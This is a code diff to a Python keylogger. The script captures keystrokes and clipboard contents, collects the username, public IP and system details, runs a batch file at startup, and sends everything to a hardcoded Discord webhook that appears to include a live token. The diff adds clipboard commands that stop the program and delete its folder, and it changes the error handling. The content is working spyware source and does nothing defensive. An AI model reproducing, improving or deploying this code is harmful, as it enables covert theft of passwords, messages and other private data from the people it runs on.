@@ -6,7 +6,6 @@ import time
 from pynput import keyboard
 import psutil
 import pyperclip
-import shutil
 
 # Discord webhook URL (replace with your own webhook URL)
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'
@@ -39,11 +38,7 @@ def run_bat_file():
         subprocess.run([bat_file_path], check=True)
         print(f"Successfully ran {bat_file_path}")
     except subprocess.CalledProcessError as e:
-        send_to_webhook(f"Error running {bat_file_path}: {e}")
-    except FileNotFoundError as e:
-        send_to_webhook(f"File not found: {e}")
-    except Exception as e:
-        send_to_webhook(f"Unexpected error: {e}")
+        print(f"Error running {bat_file_path}: {e}")
 
 
 def get_public_ip():
@@ -76,15 +71,11 @@ def keystroke_monitor():
     """Monitor keystrokes and send them after 3 seconds of inactivity."""
     global keystrokes, last_keypress_time
     while True:
-        try:
-            time.sleep(1)
-            with lock:
-                if keystrokes and time.time() - last_keypress_time > 3:
-                    send_to_webhook(keystrokes)
-                    keystrokes = ""
-        except Exception as e:
-            send_to_webhook(f"Error in keystroke monitor: {e}")
-            break
+        time.sleep(1)
+        with lock:
+            if keystrokes and time.time() - last_keypress_time > 3:
+                send_to_webhook(keystrokes)
+                keystrokes = ""
 
 
 def on_press(key):
@@ -100,31 +91,41 @@ def on_press(key):
 
 
 def on_release(key):
-    try:
-        current_clipboard = pyperclip.paste()
+    global last_clipboard
+    # Don't perform any action until a significant clipboard change is detected
+    current_clipboard = pyperclip.paste()
+
+    if current_clipboard != last_clipboard:
+        last_clipboard = current_clipboard
         if "/kill" in current_clipboard:
             send_to_webhook(f"Kill command executed by: {username}")
             return False
-    except pyperclip.PyperclipException as e:
-        send_to_webhook(f"Clipboard error: {e}")
-        return False
 
+        elif "/remove" in current_clipboard:
+            send_to_webhook(f"Removed by: {username}")
+            file_path = rf"C:\users\{username}\kl2.1"
+            try:
+                os.rmdir(file_path)
+                send_to_webhook(f"Directory removed: {file_path}")
+            except OSError as e:
+                send_to_webhook(f"Error removing directory: {e}")
+            return False
+
+    return True
 
 def monitor_clipboard():
     """Monitor the clipboard for changes and send the content to the webhook."""
     global last_clipboard
     while True:
+        time.sleep(1)
         try:
-            time.sleep(1)
             current_clipboard = pyperclip.paste()
             if current_clipboard != last_clipboard:
-                send_to_webhook(f" {username} just copied something to clipboard!")
+                send_to_webhook(f"{username} just copied something to clipboard!")
                 send_to_webhook(f"Clipboard content: {current_clipboard}")
                 last_clipboard = current_clipboard
         except Exception as e:
-            send_to_webhook(f"Error in clipboard monitor: {e}")
-            break
-
+            print(f"Error accessing clipboard: {e}")
 
 # Run kill.bat file at the start
 run_bat_file()
@@ -147,15 +148,12 @@ send_to_webhook(f"Memory info: Total: {memory_info.total}, Available: {memory_in
 send_to_webhook(f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")
 
 # Start the keystroke monitor and clipboard monitor threads
-try:
-    threading.Thread(target=keystroke_monitor, daemon=True).start()
-    threading.Thread(target=monitor_clipboard, daemon=True).start()
-except Exception as e:
-    send_to_webhook(f"Error starting threads: {e}")
+threading.Thread(target=keystroke_monitor, daemon=True).start()
+threading.Thread(target=monitor_clipboard, daemon=True).start()
 
 # Set up the keyboard listener
 try:
     with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
-except Exception as e:
-    send_to_webhook(f"Error in keyboard listener: {e}")
+except KeyboardInterrupt:
+    print("Listener stopped.")
